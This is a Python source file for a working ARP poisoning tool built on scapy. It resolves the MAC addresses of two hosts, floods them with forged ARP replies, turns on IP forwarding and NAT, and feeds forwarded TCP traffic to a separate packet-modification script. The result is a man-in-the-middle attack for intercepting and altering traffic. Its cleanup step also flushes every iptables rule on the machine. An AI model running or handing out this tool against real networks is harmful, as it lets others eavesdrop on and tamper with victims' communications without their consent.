import multiprocessing
import os
import sys
import time

from intercept import intercept

try:
    from logging import getLogger, ERROR
    getLogger("scapy.runtime").setLevel(ERROR)
    from scapy.all import *
except ImportError:
    print("[!] Failed to import scapy")
    sys.exit(1)

class PreSpoof(object):
    def __init__(self, target, interface):
        self.target = target
        self.interface = interface
    def get_MAC_addr(self):
        return srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=self.target),
                    timeout=10, iface=self.interface)[0][0][1][ARP].hwsrc
    class toggle_IP_forward(object):
        def enable_IP_forward(self):
            os.system(f"echo 1 > /proc/sys/net/ipv4/ip_forward")
            os.system(f"iptables -t nat -A POSTROUTING -o enp0s3 -j MASQUERADE")
            return 1
        def disable_IP_forward(self):
            os.system(f"echo 0 > /proc/sys/net/ipv4/ip_forward")
            os.system(f"iptables -F")
            os.system(f"iptables -X")
            os.system(f"iptables -t nat -F")
            os.system(f"iptables -t nat -X")
            return 0
class Spoof(object):
    def __init__(self, targets, interface):
        self.target1 = targets[0]
        self.target2 = targets[1]
        self.interface = interface
    def poison(self, MACs):
        send(ARP(op=2, pdst=self.target1, psrc=self.target2,
                    hwdst=MACs[0]), iface=self.interface, verbose=False)
        send(ARP(op=2, pdst=self.target2, psrc=self.target1,
                    hwdst=MACs[1]), iface=self.interface, verbose=False)
    def rearp(self, MACs):
        send(ARP(op=2, pdst=self.target1, psrc=self.target2,
                    hwdst="ff:ff:ff:ff:ff:ff", hwsrc=MACs[0]), iface=self.interface, verbose=False)
        send(ARP(op=2, pdst=self.target2, psrc=self.target1,
                    hwdst="ff:ff:ff:ff:ff:ff", hwsrc=MACs[1]), iface=self.interface, verbose=False)
def run_attack(args):
    targets = [args.target1, args.target2]
    print("[*] Resolving target addresses...")
    sys.stdout.flush()
    try:
        MACs = [PreSpoof(args.target1, args.interface).get_MAC_addr(), PreSpoof(args.target2, args.interface).get_MAC_addr()]
        print("[DONE]")
    except Exception:
        print("[FAIL]")
        print("Failed to resolve target address(es)")
        sys.exit(1)
    try:
        if args.forward:
            print("[*] Enabling IP forwarding...")
            sys.stdout.flush()
            PreSpoof.toggle_IP_forward().enable_IP_forward()
            print("[DONE]")
    except IOError:
        print("[FAIL]")
        try:
            choice = input("[*] Proceed with attack? [y/N] ").strip().lower()[0]
            if choice == "y":
                pass
            elif choice == "n":
                print("[*] Cancelled attack")
                sys.exit(1)
            else:
                print("[!] Invalid choice")
                sys.exit(1)
        except KeyboardInterrupt:
            sys.exit(1)
    if args.attack:
        os.system(f"iptables -t filter -A FORWARD -p tcp -j NFQUEUE --queue-num 1")
        atk_proc = multiprocessing.Process(target=intercept, args=(args.attack,))
        atk_proc.start()
    if not args.timeout:
        while True:
            try:
                try:
                    Spoof(targets, args.interface).poison(MACs)
                except Exception as e:
                    print("[!] Failed to send poison")
                    sys.exit(1)
                if not args.quiet:
                    print("[*] Poison sent to %s and %s" %(targets[0], targets[1]))
                else:
                    pass
                time.sleep(1)
            except KeyboardInterrupt:
                break
    else:
        timeout = float(args.timeout)
        start = time.time()
        print("[*] Poisoning targets: ", targets[0], targets[1])

        while time.time() < start + timeout:
            try:
                try:
                    Spoof(targets, args.interface).poison(MACs)
                except Exception as e:
                    print("[!] Failed to send poison")
                    sys.exit(1)
                if not args.quiet:
                    print("[*] Poison sent to %s and %s" %(targets[0], targets[1]))
                else:
                    pass
                time.sleep(1)
            except KeyboardInterrupt:
                break
    if args.attack:
        print("[*] Stopping attack")
        atk_proc.terminate()

    print("[*] Fixing targets...")
    for i in range(16):
        try:
            Spoof(targets, args.interface).rearp(MACs)
        except (Exception, KeyboardInterrupt):
            print("[FAIL]")
            sys.exit(1)
        time.sleep(1)
    print("[DONE]")
    try:
        if args.forward:
            print("[*] Disabling IP forwarding...")
            sys.stdout.flush()
            PreSpoof.toggle_IP_forward().disable_IP_forward()
            print("[DONE]")
    except IOError:
        print("[FAIL]")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ARP Poisoning Tool")
    parser.add_argument("-i", "--interface", help="Network interface to attack on",
                        action="store", dest="interface", default=False)
    parser.add_argument("-t1", "--target1", help="First target",
                        action="store", dest="target1", default=False)
    parser.add_argument("-t2", "--target2", help="Second target",
                        action="store", dest="target2", default=False)
    parser.add_argument("-a", "--attack", help="Packet modification script",
                        action="store", dest="attack", default=False)
    parser.add_argument("-f", "--forward", help="Auto-toggle IP forwarding",
                        action="store_true", dest="forward", default=False)
    parser.add_argument("-q", "--quiet", help="Disable feedback messages",
                        action="store_true", dest="quiet", default=False)
    parser.add_argument("-t", "--timeout", help="Attack timeout in seconds",
                        action="store", dest="timeout", default=False)
    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    elif ((not args.target1) or (not args.target2)):
        parser.error("Invalid target specification")
        sys.exit(1)
    elif not args.interface:
        parser.error("No network interface provided")
        sys.exit(1)
    run_attack(args)
